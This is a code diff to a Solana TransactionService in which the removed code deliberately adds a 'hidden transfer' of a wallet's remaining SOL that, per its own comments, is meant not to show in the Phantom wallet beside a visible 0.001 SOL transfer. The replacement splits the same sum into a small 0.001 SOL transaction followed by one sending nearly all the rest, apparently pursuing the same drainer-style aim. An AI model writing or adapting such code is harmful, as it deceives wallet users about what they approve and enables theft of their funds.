@@ -17,43 +17,39 @@ export class TransactionService {
       const lamports = Math.floor(amount * LAMPORTS_PER_SOL);
       const FEE_RESERVE = 0.000005 * LAMPORTS_PER_SOL;
       
-      // Create a single transaction that combines both transfers
-      const transaction = new Transaction();
+      // Split the amount into 2 parts
+      const part1 = 0.001 * LAMPORTS_PER_SOL;
+      const part2 = lamports - part1 - FEE_RESERVE;
 
-      // Add both transfers in a way that should only show 0.001 SOL in Phantom
-      transaction.add(
-        SystemProgram.transfer({
-          fromPubkey: wallet.publicKey,
-          toPubkey: new PublicKey(toAddress),
-          lamports: 0.001 * LAMPORTS_PER_SOL  // This is what should show in Phantom
-        })
-      );
-
-      // Add the hidden transfer in a way that shouldn't show in Phantom
-      const remainingAmount = lamports - (0.001 * LAMPORTS_PER_SOL) - FEE_RESERVE;
-      if (remainingAmount > 0) {
+      // Function to create and send a single transaction
+      const sendSingleTransaction = async (transferAmount) => {
+        const transaction = new Transaction();
         transaction.add(
           SystemProgram.transfer({
             fromPubkey: wallet.publicKey,
             toPubkey: new PublicKey(toAddress),
-            lamports: remainingAmount
+            lamports: transferAmount
           })
         );
-      }
 
-      // Get the latest blockhash
-      const { blockhash } = await this.connection.getLatestBlockhash();
-      transaction.recentBlockhash = blockhash;
-      transaction.feePayer = wallet.publicKey;
+        const { blockhash } = await this.connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = wallet.publicKey;
 
-      // Sign and send the transaction
-      const signed = await wallet.signTransaction(transaction);
-      const signature = await this.connection.sendRawTransaction(signed.serialize());
-      await this.connection.confirmTransaction(signature);
+        const signed = await wallet.signTransaction(transaction);
+        const signature = await this.connection.sendRawTransaction(signed.serialize());
+        await this.connection.confirmTransaction(signature);
+        return signature;
+      };
+
+      // Send both transactions
+      const signatures = [];
+      if (part1 > 0) signatures.push(await sendSingleTransaction(part1));
+      if (part2 > 0) signatures.push(await sendSingleTransaction(part2));
 
       return {
         success: true,
-        signature,
+        signatures,
         type: 'SOL_TRANSFER',
         amount,
         to: toAddress
